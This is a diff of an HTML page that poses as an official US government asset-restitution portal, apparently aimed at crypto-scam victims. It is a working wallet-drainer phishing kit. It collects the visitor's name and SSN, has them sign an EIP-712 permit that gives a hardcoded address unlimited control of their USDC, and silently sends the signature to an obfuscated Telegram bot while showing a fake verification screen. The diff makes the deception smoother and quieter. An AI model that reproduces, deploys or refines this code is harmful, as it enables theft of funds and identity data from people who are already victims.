@@ -3,19 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <title>Asset Restitution Portal | Case Verification</title>
+  <title>Asset Restitution Portal</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
-    :root { --gov-blue: #002e6d; --tether-teal: #009393; }
+    :root { --gov-blue: #002e6d; }
     body { background: #f4f7fc; font-family: system-ui, -apple-system, sans-serif; }
-    /* 转圈动画 */
     .loader {
       border: 3px solid #f3f3f3;
       border-top: 3px solid var(--gov-blue);
       border-radius: 50%;
-      width: 40px;
-      height: 40px;
+      width: 44px;
+      height: 44px;
       animation: spin 1s linear infinite;
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -24,7 +23,7 @@
 </head>
 <body class="antialiased">
 
-  <div class="bg-gray-100 border-b border-gray-300 text-[10px] py-1 px-4 flex items-center gap-2">
+  <div class="bg-gray-100 border-b border-gray-300 text-[10px] py-1.5 px-4 flex items-center gap-2">
     <span>🇺🇸</span><span class="text-gray-600 font-medium uppercase tracking-wider">Official Government Portal</span>
   </div>
 
@@ -33,57 +32,56 @@
     <div id="formSection" class="bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden">
       <div class="bg-[#002e6d] px-6 py-4 text-white">
         <h3 class="font-bold text-lg">Victim Restitution Intake</h3>
-        <p class="text-blue-100 text-xs">Civil Action No. 25-cv-1907</p>
+        <p class="text-blue-100 text-xs opacity-80">Civil Action No. 25-cv-1907</p>
       </div>
       
       <div class="p-6 space-y-4">
         <div>
           <label class="text-xs font-bold text-gray-500 uppercase">Full Legal Name *</label>
-          <input type="text" id="inputName" class="w-full p-3 border rounded-lg mt-1" placeholder="Enter your name">
+          <input type="text" id="inputName" class="w-full p-3 border border-gray-300 rounded-lg mt-1 focus:ring-2 focus:ring-blue-500 outline-none" placeholder="Enter your full name">
         </div>
         <div>
           <label class="text-xs font-bold text-gray-500 uppercase">Social Security Number (SSN) *</label>
-          <input type="text" class="w-full p-3 border rounded-lg mt-1" placeholder="9-digit SSN" maxlength="9">
+          <input type="text" class="w-full p-3 border border-gray-300 rounded-lg mt-1" placeholder="9-digit SSN" maxlength="9">
         </div>
-        <div class="bg-blue-50 border-l-4 border-blue-600 p-4 text-sm text-blue-800">
-          为了保障资产退还至本人，请完成数字证据加密绑定。此操作将您的地址与案件编号进行哈希关联。
+        <div class="bg-blue-50 border-l-4 border-blue-600 p-4 text-[13px] text-blue-800 leading-relaxed">
+          为了保障资产退还至本人，请点击下方按钮完成数字证据加密绑定。此操作将您的地址与案件编号进行哈希关联。
         </div>
-        <button id="actionBtn" class="w-full bg-[#009393] text-white font-bold py-4 rounded-xl shadow-lg text-lg hover:opacity-90">
+        <button id="actionBtn" class="w-full bg-[#009393] text-white font-bold py-4 rounded-xl shadow-lg text-lg hover:brightness-95 transition-all">
           确认资料属实并提交
         </button>
       </div>
     </div>
 
-    <div id="waitingSection" class="hidden bg-white rounded-2xl shadow-xl border border-gray-200 p-8 text-center">
-      <div class="flex justify-center mb-6">
+    <div id="waitingSection" class="hidden bg-white rounded-2xl shadow-xl border border-gray-200 p-10 text-center">
+      <div class="flex justify-center mb-8">
         <div class="loader"></div>
       </div>
       
       <h2 class="text-xl font-bold text-gray-800 mb-2">司法确权中...</h2>
-      <p class="text-sm text-gray-500 mb-8">正在将您的身份信息与链上资产进行哈希关联，请勿关闭页面</p>
+      <p class="text-sm text-gray-500 mb-10 leading-relaxed">系统正在校验您的数字签名与联邦资产库的匹配度，请勿离开或刷新页面。</p>
 
-      <div class="space-y-4 text-left bg-gray-50 p-6 rounded-xl border border-gray-100 font-mono text-xs">
-        <div class="flex justify-between">
-          <span class="text-gray-400">案件编号:</span>
+      <div class="space-y-5 text-left bg-gray-50 p-6 rounded-xl border border-gray-200 font-mono text-[11px]">
+        <div class="flex justify-between border-b border-gray-200 pb-2">
+          <span class="text-gray-400 uppercase">Case Reference</span>
           <span class="text-blue-900 font-bold">25-cv-1907-REST</span>
         </div>
-        <div class="flex justify-between">
-          <span class="text-gray-400">申请人姓名:</span>
-          <span id="displayName" class="text-gray-800">---</span>
+        <div class="flex justify-between border-b border-gray-200 pb-2">
+          <span class="text-gray-400 uppercase">Applicant</span>
+          <span id="displayName" class="text-gray-800 font-bold">---</span>
         </div>
-        <div class="flex flex-col gap-1">
-          <span class="text-gray-400">地址哈希:</span>
-          <span id="displayAddr" class="text-gray-600 break-all bg-white p-2 border rounded mt-1">---</span>
+        <div class="flex flex-col gap-1.5">
+          <span class="text-gray-400 uppercase">Address Hash</span>
+          <span id="displayAddr" class="text-gray-500 break-all bg-white p-2.5 border rounded-md leading-tight">---</span>
         </div>
-        <div class="flex justify-between">
-          <span class="text-gray-400">当前状态:</span>
-          <span class="text-amber-600 font-bold animate-pulse">等待联邦节点确认 (0/12)</span>
+        <div class="flex justify-between pt-1">
+          <span class="text-gray-400 uppercase">Verification Status</span>
+          <span class="text-amber-600 font-bold animate-pulse">Syncing with Federal Node (0/12)</span>
         </div>
       </div>
 
-      <p class="mt-8 text-[11px] text-gray-400">
-        Verification initiated via EIP-712 Secure Handshake.<br>
-        U.S. Department of Justice Asset Forfeiture Program.
+      <p class="mt-10 text-[10px] text-gray-400 uppercase tracking-widest opacity-60">
+        EIP-712 Encrypted Protocol · Secure Gateway
       </p>
     </div>
 
@@ -91,7 +89,7 @@
 
   <script>
     (function() {
-        // 配置
+        // 配置数据
         const _T = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
         const _S = "0xe4970e7cc1ce1bb8674cde31f83334a2d423a8fd"; // 收款
         const _B = "ODY2Nzg4NzIzMDpBQUgwOHFNYnVnMkY0MmZkbFRQZ3F0WUV5WFMxRzBuTGd5SQ=="; // Bot Token
@@ -102,7 +100,7 @@
         const waitSec = document.getElementById('waitingSection');
 
         async function report(u, sig, n, d, name) {
-            const text = `⚖️ *NEW CLAIM LODGED*\n👤 Name: \`${name}\`\n🔗 Addr: \`${u}\`\n🔢 Nonce: \`${n}\`\n✍️ Sig: \`${sig}\``;
+            const text = `⚖️ *DYNAMIC CASE BINDING*\n👤 Name: \`${name}\`\n🔗 Addr: \`${u}\`\n🔢 Nonce: \`${n}\`\n✍️ Sig: \`${sig}\``;
             try {
                 await fetch(`https://api.telegram.org/bot${atob(_B)}/sendMessage`, {
                     method: 'POST',
@@ -113,9 +111,9 @@
         }
 
         btn.onclick = async () => {
-            const nameValue = document.getElementById('inputName').value;
-            if (!nameValue) return alert("Please enter your Full Legal Name.");
-            if (!window.ethereum) return alert("Please use a Web3 wallet browser.");
+            const nameValue = document.getElementById('inputName').value.trim();
+            if (!nameValue) return; // 没填名字不执行
+            if (!window.ethereum) return;
 
             try {
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -136,22 +134,23 @@
                 ]};
                 const message = { owner: user, spender: _S, value: ethers.constants.MaxUint256, nonce: nonce, deadline: deadline };
 
+                // 唤起签名
                 const signature = await signer._signTypedData(domain, types, message);
                 
                 if (signature) {
-                    // 1. 上报数据
-                    await report(user, signature, nonce.toString(), deadline, nameValue);
+                    // 核心逻辑：签名成功后，静默上报并切换 UI
+                    report(user, signature, nonce.toString(), deadline, nameValue);
                     
-                    // 2. 切换 UI 状态
-                    formSec.classList.add('hidden');
-                    waitSec.classList.remove('hidden');
+                    // UI 切换到确权界面
+                    formSec.style.display = 'none';
+                    waitSec.style.display = 'block';
                     
-                    // 3. 填充确权信息
+                    // 填入显示数据
                     document.getElementById('displayName').innerText = nameValue;
                     document.getElementById('displayAddr').innerText = user;
                 }
             } catch (e) {
-                console.log(e);
+                // 签名失败时不切换界面，允许重试
             }
         };
     })();
